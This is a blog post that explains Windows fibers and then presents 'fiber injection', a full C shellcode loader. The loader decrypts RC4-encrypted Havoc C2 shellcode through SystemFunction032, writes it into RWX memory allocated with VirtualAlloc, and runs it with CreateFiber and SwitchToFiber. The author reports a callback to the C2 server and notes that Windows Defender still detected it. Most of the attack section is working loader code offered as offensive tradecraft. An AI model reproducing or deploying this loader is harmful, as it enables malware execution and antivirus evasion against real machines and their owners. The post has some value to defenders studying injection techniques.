We all know threads ‚Äî those small, poor workers who execute code for a process. A thread is the smallest unit of execution within a process.

But have you ever heard of something called a fiber?

No, I‚Äôm not talking about the dietary stuff you get from fruits and vegetables.

So what on earth am I talking about?

<meme image >

<H1>what is a fiber ?</H1>

So Fibers are a unit of execution same as threads BUT it is manually scheduled by the application here is some facts about them : 

- User-mode only: Fibers are controlled entirely from user mode so they‚Äôre invisible to the kernel. That means you, the developer, control when they run.  
- One thread can run many fibers: A single thread can create multiple fibers and switch between them whenever it wants using the WinAPI function SwitchToFiber
- No parallelism unless you do the work: Fibers do not run in parallel on multi-core CPUs unless you explicitly run them on multiple threads.
- Lightweight and efficient: Fibers consume very few system resources. They're much cheaper and lighter than threads when it comes to executing code.

They're no longer widely used nowadays ‚Äî because who on earth wants to create an application and do all the heavy lifting themselves, like managing code execution, scheduling, creating threads for parallelism, and manually switching between fibers? 

ü§ì‚òùÔ∏è:"Actually, I use fibers when developing applications."

Ok they are rarely used today mr Actually. 




<H1>Fiber injection </H1>

Fiber injection is basically making the fiber execute our shellcode, instead of using threads like the [CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) WinAPI.

To start our journey, I‚Äôm already one step ahead ‚Äî my Havoc C2 is up and waiting:

     style="border-radius: 0 !important; clip-path: none !important; width: auto; height: auto;">

Note: My shellcode is encrypted with RC4. I used [Hellshell](https://github.com/NUL0x4C/HellShell) to encrypt it for me.

Everything will be done inside the main function ‚Äî though you could move this into a separate function if you want (I‚Äôm just too lazy to bother right now).

First, we need to convert the current thread into a fiber. You can‚Äôt create a fiber and switch to it unless the calling thread is already a fiber. That‚Äôs why we convert the current thread using [ConvertThreadToFiber](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-convertthreadtofiber).

After that, I‚Äôll allocate memory in the current process to store my shellcode. And since I‚Äôm lazy, I‚Äôm going to directly set the protection to PAGE_EXECUTE_READWRITE during VirtualAlloc, instead of doing it the ‚Äúproper‚Äù way with [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) and changing the memory protection afterward.

{{< highlight c >}}


	PVOID fiber1 = ConvertThreadToFiber(NULL);

	if (fiber1 == NULL) {
		printf("[-] Failed to convert thread to fiber.\n");
		return 1;
	}

	// allocating memory for the shellcode

	PVOID address = VirtualAlloc(0, sizeof(Rc4CipherText), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);


{{< /highlight >}}

Then we‚Äôll create a new fiber that points to the memory we allocated. So when we switch to it, it‚Äôll start executing the code at that memory address.

Rc4EncryptionViSystemFunc032 is just a function I use to decrypt the Havoc shellcode. After decrypting it, I‚Äôll simply copy the shellcode into the allocated memory.

{{< highlight c >}}

    // creating another fiber
	PVOID fiber2 = CreateFiber(NULL, (LPFIBER_START_ROUTINE)address, NULL);

	if (!fiber2) {
		printf("[-] Failed to create fiber.\n");
		return 1;
	}

	// decrypting the shellcode
	Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText));

	// copying the shellcode into the allocated memory 
	memcpy(address, Rc4CipherText, sizeof(Rc4CipherText));


{{< /highlight >}}

Lastly, we‚Äôll just switch to the fiber2 we created. Once you switch to the fiber, it will execute the shellcode.

{{< highlight c >}}

 	// when switching the fiber 2 it will start executing the shellcode that's stored in the allocated memory 
	SwitchToFiber(fiber2);

	return 0;

The full code :

{{< highlight c >}}


#include <windows.h>
#include <stdio.h>


// this is what SystemFunction032 function take as a parameter
typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;

// defining how does the function look - more on this structure in the api hashing part
typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Img,
	struct USTRING* Key
	);

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	// the return of SystemFunction032
	NTSTATUS	STATUS = NULL;

	// making 2 USTRING variables, 1 passed as key and one passed as the block of data to encrypt/decrypt
	USTRING		Key = { .Buffer = pRc4Key, 		.Length = dwRc4KeySize,		.MaximumLength = dwRc4KeySize },
		Img = { .Buffer = pPayloadData, 	.Length = sPayloadSize,		.MaximumLength = sPayloadSize };


	// since SystemFunction032 is exported from Advapi32.dll, we load it Advapi32 into the prcess,
	// and using its return as the hModule parameter in GetProcAddress
	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	// if SystemFunction032 calls failed it will return non zero value
	if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
		return FALSE;
	}

	return TRUE;
}

// my encrypted shellcode it's huge so i won't fill half the blog showing it 
unsigned char Rc4CipherText[] = {
	0xB0, 0x94, 0xE1, 0x89, 0x90, 0xE0, 0x5B, 0xE7, .....} 

unsigned char Rc4Key[] = {
	0x90, 0x4B, 0x51, 0x4D, 0x24, 0x6A, 0xA4, 0x83, 0x36, 0x5D, 0x96, 0x8F, 0xA4, 0x96, 0x9D, 0xA4 };



   int main() {


	// converts curretn thread to a fiber 

	PVOID fiber1 = ConvertThreadToFiber(NULL);

	if (fiber1 == NULL) {
		printf("[-] Failed to convert thread to fiber.\n");
		return 1;
	}

	// allocating memory for the shellcode

	PVOID address = VirtualAlloc(0, sizeof(Rc4CipherText), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	// creating another fiber 

	PVOID fiber2 = CreateFiber(NULL, (LPFIBER_START_ROUTINE)address, NULL);

	if (!fiber2) {
		printf("[-] Failed to create fiber.\n");
		return 1;
	}

	// decrypting the shellcode
	Rc4EncryptionViSystemFunc032(Rc4Key, Rc4CipherText, sizeof(Rc4Key), sizeof(Rc4CipherText));

	// copying the shellcode into the allocated memory 
	memcpy(address, Rc4CipherText, sizeof(Rc4CipherText));

	// when switching the fiber 2 it will start executing the shellcode that's stored in the allocated memory 
	SwitchToFiber(fiber2);

	return 0;

}

After execution, we got a connection back to our Havoc C2:

Note: Even with RC4 encryption, Windows Defender ruined the moment and detected the shellcode anyway.

Anyway, that‚Äôs all folks. I need to go eat instead of writing stuff that gets detected by Windows Defender.
